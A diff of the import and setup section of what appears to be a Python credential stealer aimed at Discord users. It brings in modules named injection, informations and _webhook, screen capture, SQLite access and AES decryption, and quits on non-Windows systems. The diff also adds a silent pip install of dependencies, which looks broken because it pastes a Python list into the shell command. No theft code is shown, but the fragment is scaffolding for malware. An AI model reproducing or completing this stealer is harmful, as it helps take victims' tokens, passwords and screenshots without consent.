@@ -1,55 +1,42 @@
-import os
-import threading
-import re
-import time
-import shutil
-import random
-import subprocess
-import platform
-import socket
-import getpass
-import psutil
-from base64 import b64decode
-from json import loads as json_loads
-from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
-from sys import executable, argv
-from sqlite3 import connect as sql_connect
-from urllib.request import Request, urlopen
-from json import loads, dumps
-from zipfile import ZipFile
-
-from Crypto.Cipher import AES
-
 import discordc
-from configuration import Config 
-cc = Config()
-
 import injection
-
-import informations 
+import informations
 ii = informations.Info()
-
 import _webhook
 _webh = _webhook.WebhookX()
-
+from configuration import Config 
+cc = Config()
 try:
+    import os
+    import threading
+    import re
+    import time
+    import shutil
+    import random
+    import subprocess
+    import platform
+    import socket
+    import getpass
     import requests
+    import psutil
     from PIL import ImageGrab
+    from base64 import b64decode
+    from json import loads as json_loads
+    from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+    from sys import executable, argv
+    from sqlite3 import connect as sql_connect
+    from urllib.request import Request, urlopen
+    from json import loads, dumps
+    from zipfile import ZipFile
+    from Crypto.Cipher import AES
+except:
+    import subprocess
+    requirements = ["requests", "Pillow", "pycryptodome", "psutil", "WMI", "discord", "dhooks"]
+    subprocess.run(f"python -m pip install {requirements}", shell=True)
 
-except ModuleNotFoundError:
-    os.system("pip install requests")
-    os.system("pip install pillow")
-    
-    requirements = [["requests", "requests"], ["Crypto.Cipher", "pycryptodome"], ["PIL", "pillow"], ["discord", "discord"], ["wmi", "wmi"], ["psutil", "psutil"]]
-    for modl in requirements:
-        try:
-            __import__(modl[0])
-        except Exception:
-            subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
-            time.sleep(3)
-            
 if platform.system() != "Windows":
     quit()
+
 
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
